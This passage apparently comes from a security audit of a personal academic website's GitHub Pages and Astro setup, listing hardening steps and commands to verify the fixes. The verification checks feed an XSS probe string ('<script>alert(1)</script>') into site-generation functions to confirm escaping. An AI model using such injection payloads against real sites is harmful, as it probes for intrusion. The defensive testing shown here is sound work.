[PHASE 2: PRODUCTION CUTOVER / DEPLOYMENT]
  6. Enforce Least Privilege in Workflows:
     - Add permissions: contents: read to all test workflows in .github/workflows/.
  7. Verify GitHub Domain Ownership:
     - Add DNS TXT records (_github-pages-challenge-*) at domain registrar.
  8. Switch GitHub Pages Deployment Source:
     - In GitHub repository Settings > Pages, switch source from "/docs" branch to "GitHub Actions".
     - Confirm "Enforce HTTPS" is active.
  9. Retire Legacy docs/ Directory:
     - Delete docs/ from main branch to eliminate unhashed MathJax/Polyfill CDN scripts.

[PHASE 3: LONG-TERM HARDENING / ARCHITECTURAL MATURITY]
 10. Route DNS Through Cloudflare:
     - Enable Full (Strict) SSL and inject HSTS, X-Frame-Options, and X-Content-Type-Options.
 11. Pin GitHub Actions to Commit SHAs:
     - Replace mutable tags (@v4, @v2) with immutable 40-character SHAs across workflows.
 12. Vendor External Stylesheets:
     - Vendor Font Awesome and Academicons locally to eliminate unhashed CSS @import rules.
```

### 8.2 Verification Commands & Validation Checks

The following commands can be executed by auditors and maintainers to independently verify the presence of vulnerabilities and confirm the efficacy of patches:

1. **Verify Workflow Script Injection Fix**:
   ```bash
   grep -n "inputs.reason" .github/workflows/update-visual-baselines.yml
   ```
   *Target Result*: `${{ inputs.reason }}` must only appear in an `env:` block (e.g. `INPUT_REASON: ${{ inputs.reason }}`), never directly inside a `run:` script.

2. **Verify News Pipeline Sanitization**:
   ```bash
   python3 -c "from scripts.sitegen.news import news_body_html; print(news_body_html('<script>alert(1)</script>'))"
   ```
   *Prerequisite*: Executing `scripts.sitegen` modules requires Python dependencies installed (`pip install -r requirements.txt` or an active virtual environment containing `PyYAML`).
   *Target Result*: Dangerous elements must be neutralized (e.g. converted to `&lt;script&gt;alert(1)&lt;/script&gt;` or sanitized), while safe hyperlinks (e.g. `<a href="/publications/">Link</a>` or Markdown `[Link](/publications/)`) are preserved and rendered correctly.

3. **Verify Publication Title Sanitization**:
   ```bash
   python3 -c "from scripts.sitegen.publication_rendering import render_publication_entry; print(render_publication_entry({'id': 't', 'title': '<script>alert(1)</script>', 'authors': 'A. Author', 'periodical': 'Journal', 'abstract': '', 'bibtex': '', 'category': 'cat'}, 't', 'row', ''))"
   ```
   *Target Result*: Output must contain `<h3>&lt;script&gt;alert(1)&lt;/script&gt;</h3>`.

4. **Verify Dead `bibliography` Pruning**:
   ```bash
   grep -n '"bibliography"' astro/package.json
   grep -rn "bibliography" astro/src/ astro/scripts/
   ```
   *Target Result*: `bibliography` should not appear in `astro/package.json` or any source files.

5. **Verify In-Artifact CNAME Existence**:
   ```bash
   test -f astro/public/CNAME && cat astro/public/CNAME
   ```
   *Target Result*: File exists and outputs `www.silviofanzon.com`.

6. **Verify Test Suite & Build Health**:
   ```bash
   npm run test:quick
   cd astro && npm run build:astro
   ```
   *Target Result*: All unit and regression tests pass without errors.
